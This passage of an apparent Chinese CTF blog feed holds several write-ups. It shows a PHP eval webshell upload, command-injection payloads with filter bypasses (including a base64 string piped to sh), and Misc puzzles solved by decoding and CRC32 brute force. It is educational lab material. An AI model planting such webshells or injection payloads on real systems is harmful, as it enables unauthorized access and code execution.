&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;上传一句话木马233.php：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
@eval($_POST[&amp;#39;b&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再用一句话木马的shell执行插件：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;进入shell，目录下面多了一个名为**.antproxy.php**的文件：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p&gt;</description></item><item><title>GXYCTF2019 Ping Ping Ping</title><link>https://www.braindance.top/posts/ctf/gxyctf2019ping-ping-ping/</link><pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/gxyctf2019ping-ping-ping/</guid><description>&lt;h1 id="gxyctf2019ping-ping-ping"&gt;[GXYCTF2019]Ping Ping Ping
&lt;/h1&gt;&lt;p&gt;题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&lt;/p&gt;
&lt;p&gt;和DMCTF做的那道&lt;strong&gt;pingpingping&lt;/strong&gt;类似，同样是使用管道符构造payload，先使用：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?ip=127.0.0.1|ls
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目录下有两个文件：&lt;code&gt;flag.php&lt;/code&gt;、&lt;code&gt;index.php&lt;/code&gt;。首先试出来了空格被过滤，使用以下绕过空格：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
&amp;lt;
&amp;lt;&amp;gt;
{cat,flag.php} //用逗号实现了空格功能
%20
%09
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在linux下反单引号里面的指令会被执行 &lt;strong&gt;`ls`&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?ip=|cat$IFS`ls`
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;会输出该目录下所有可以打开的文件，可以查看&lt;strong&gt;index.php&lt;/strong&gt;的部分源码有哪些过滤：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;/?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;ip&lt;/span&gt;&lt;span style="color:#f92672"&gt;=|&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;\&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;|&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;|&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span&gt;, $ip, $match)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;|&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span&gt;, $ip, $match);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your symbol!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/ /&amp;#34;&lt;/span&gt;, $ip)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your space!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/bash/&amp;#34;&lt;/span&gt;, $ip)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your bash!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;&lt;/span&gt;, $ip)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your flag!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $a &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;shell_exec&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;ping -c 4 &amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$ip);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;print_r&lt;/span&gt;($a);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问&lt;strong&gt;flag.php&lt;/strong&gt;。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用&lt;strong&gt;readflag&lt;/strong&gt;的ELF执行文件访问，但是还没成功。其实执行：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?ip=|cat$IFS`ls`
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了&lt;del&gt;我是傻逼&lt;/del&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后记录下学到的姿势和这道题目的其他思路&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;管道符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;|&lt;/code&gt;直接执行后面的语句。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;||&lt;/code&gt;如果前面语句错误，执行后面的语句。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;前面和后面命令都要执行，无论前面真假，&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用以下绕过空格：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$IFS
${IFS}
${IFS}$1
$IFS$1 //$1改成$加其他数字貌似都行
&amp;lt;
&amp;lt;&amp;gt;
{cat,flag.php} //用逗号实现了空格功能
%20
%09 //需要php环境
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;覆盖源码里的&lt;code&gt;$a&lt;/code&gt;变量（拼接变量）：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;使用sh执行脚本：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;内联执行：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?ip=|cat$IFS`ls`
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;附：大佬整理的博客（内含更多姿势）：&lt;a class="link" href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener"
&gt;命令执行漏洞利用及绕过方式总结&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;</description></item><item><title>DMCTF之Misc</title><link>https://www.braindance.top/posts/ctf/dmctf%E4%B9%8Bmisc/</link><pubDate>Tue, 01 Dec 2020 11:20:45 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/dmctf%E4%B9%8Bmisc/</guid><description>&lt;h1 id="前言"&gt;前言
&lt;/h1&gt;&lt;p&gt;这次比赛是第一次做Mics的题awa。&lt;/p&gt;
&lt;h1 id="misc"&gt;Misc
&lt;/h1&gt;&lt;h2 id="check_in"&gt;Check_in
&lt;/h2&gt;&lt;p&gt;真·有手就行&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130102716.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="fakezip"&gt;fakezip
&lt;/h2&gt;&lt;p&gt;看到题目&lt;strong&gt;fakezip&lt;/strong&gt;翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：&lt;a class="link" href="https://blog.csdn.net/u011377996/article/details/79286958" target="_blank" rel="noopener"
&gt;zip伪加密&lt;/a&gt;，使用010 Editor打开压缩包，&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130103932.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt&lt;/p&gt;
&lt;p&gt;打开以后内容是：&lt;code&gt;♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=&lt;/code&gt;，音符加密虽然是第一次听说，但是百度还是可以简单找到：&lt;a class="link" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener"
&gt;文本加密为音乐符号&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130104321.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="base-family"&gt;Base family
&lt;/h2&gt;&lt;p&gt;题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：&lt;code&gt;base16&lt;/code&gt;、&lt;code&gt;base32&lt;/code&gt;、&lt;code&gt;base58&lt;/code&gt;、&lt;code&gt;base64&lt;/code&gt;、&lt;code&gt;base91&lt;/code&gt;。还有几种没听过的base种类可以在这个网站找到：&lt;a class="link" href="http://ctf.ssleye.com/" target="_blank" rel="noopener"
&gt;CTF在线工具&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原层&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&amp;amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td&amp;#34;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf&amp;amp;GP&amp;lt;Rk:o_Jk&amp;lt;J.zp8%H0g7sYSTJ9p.&amp;#34;duRBGj`g0!I+xjm(fh)]IF:&amp;gt;omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=&amp;lt;D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;base91解码&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;base58解码&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;base32解码&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;base64解码&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;hex解码&lt;/strong&gt;：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;flag{y0u_alr3ady_kn0w_th3_Basefam1ly}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="slienteye"&gt;SlientEye
&lt;/h2&gt;&lt;p&gt;根据题目直接百度&lt;strong&gt;SlientEye&lt;/strong&gt;，下载以后打开图片&amp;ndash;&amp;gt;decode：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130105145.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;amp;#102;&amp;amp;#108;&amp;amp;#97;&amp;amp;#103;&amp;amp;#123;&amp;amp;#110;&amp;amp;#49;&amp;amp;#95;&amp;amp;#98;&amp;amp;#117;&amp;amp;#95;&amp;amp;#106;&amp;amp;#49;&amp;amp;#97;&amp;amp;#110;&amp;amp;#103;&amp;amp;#95;&amp;amp;#119;&amp;amp;#117;&amp;amp;#95;&amp;amp;#100;&amp;amp;#51;&amp;amp;#125;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再去百度搜到一篇博客：&lt;a class="link" href="https://www.cnblogs.com/philipding/p/10153094.html" target="_blank" rel="noopener"
&gt;&amp;amp;#x开头的是什么编码?&lt;/a&gt;，&lt;del&gt;我点开一看，哦，原来是&lt;/del&gt;entity code实体编码，&lt;del&gt;我啪的一下就&lt;/del&gt;把flag.txt改为flag.html，&lt;del&gt;很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳&lt;/del&gt;打开flag.html获得flag：&lt;strong&gt;flag{n1_bu_j1ang_wu_d3}&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id="编码之王"&gt;编码之王
&lt;/h2&gt;&lt;p&gt;下载文件打开后一堆社会主义核心价值观，前面提到的：&lt;a class="link" href="http://ctf.ssleye.com/" target="_blank" rel="noopener"
&gt;CTF在线工具&lt;/a&gt;就有核心价值观编码，下面放密文，上面是解码内容。&lt;/p&gt;
&lt;p&gt;解出来以后看到第一句：&lt;code&gt;如是我闻:&lt;/code&gt;，&amp;ndash;&amp;gt;&lt;a class="link" href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener"
&gt;与佛论禅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;再解之后看第一句：&lt;code&gt;新佛曰：&lt;/code&gt;。&amp;ndash;&amp;gt;&lt;a class="link" href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener"
&gt;新与佛论禅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;解完以后直接出了一堆由：&lt;code&gt;[、]、!、+、(、)&lt;/code&gt;组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130110943.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="jpgsteg"&gt;jpgsteg
&lt;/h2&gt;&lt;p&gt;题目即是用到的工具，百度下载软件，使用jphide.exe打开图片&lt;code&gt;Tap code.jpg&lt;/code&gt;，选择seek功能解密，密码为123456（我蒙的）：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130111311.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;成功解密后获得一个文档，内容如下：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;... ....
.. ...
.. ...
. .
... ..
. .
..... .....
.. ....
... ...
.. ..
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的&lt;code&gt;.&lt;/code&gt;分成两部分代表坐标&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130111538.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;解码得到：&lt;code&gt;ohhamazing&lt;/code&gt; ，加上括号就是：&lt;strong&gt;flag{ohhamazing}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;事后多看了一眼图片命名：&lt;code&gt;Tap code.jpg&lt;/code&gt;。这用啥解密不就在脸上写着的&lt;del&gt;wosabi \0/&lt;/del&gt;。。。&lt;/p&gt;
&lt;h2 id="collision"&gt;Collision
&lt;/h2&gt;&lt;p&gt;打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201102424.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：&lt;a class="link" href="https://blog.csdn.net/weixin_45396639/article/details/103393759" target="_blank" rel="noopener"
&gt;crc32碰撞 ctf python&lt;/a&gt;作者原创的脚本：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; string
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; threading
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; binascii
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;crc&lt;/span&gt;(_crc):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; l &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; dic &lt;span style="color:#f92672"&gt;=&lt;/span&gt; string&lt;span style="color:#f92672"&gt;.&lt;/span&gt;printable
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _input &lt;span style="color:#f92672"&gt;=&lt;/span&gt; _crc
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _input &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;0X&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; _input
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; dic:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; n &lt;span style="color:#f92672"&gt;in&lt;/span&gt; dic:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; h &lt;span style="color:#f92672"&gt;in&lt;/span&gt; dic:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; m &lt;span style="color:#f92672"&gt;in&lt;/span&gt; dic:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; s &lt;span style="color:#f92672"&gt;=&lt;/span&gt; i &lt;span style="color:#f92672"&gt;+&lt;/span&gt; n &lt;span style="color:#f92672"&gt;+&lt;/span&gt; h &lt;span style="color:#f92672"&gt;+&lt;/span&gt; m
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; s &lt;span style="color:#f92672"&gt;=&lt;/span&gt; s&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# print(str(binascii.crc32(s)), _input)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; hex(binascii&lt;span style="color:#f92672"&gt;.&lt;/span&gt;crc32(s))&lt;span style="color:#f92672"&gt;.&lt;/span&gt;upper() &lt;span style="color:#f92672"&gt;==&lt;/span&gt; _input&lt;span style="color:#f92672"&gt;.&lt;/span&gt;upper():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(_crc, &lt;span style="color:#e6db74"&gt;&amp;#39;:&amp;#39;&lt;/span&gt;, s&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decode())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(l)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;exit() &lt;span style="color:#75715e"&gt;#直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; l &lt;span style="color:#f92672"&gt;=&lt;/span&gt; l &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;crc32&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#34;四字节碰撞!!!&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; num &lt;span style="color:#f92672"&gt;=&lt;/span&gt; int(input(&lt;span style="color:#e6db74"&gt;&amp;#34;你可能需要多个线程同时进行碰撞，请输入线程数：&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _thread &lt;span style="color:#f92672"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _args &lt;span style="color:#f92672"&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#34;输入参数&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(num):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(i&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, end&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;:&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;append(input())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# print(_args)&lt;/span&gt;
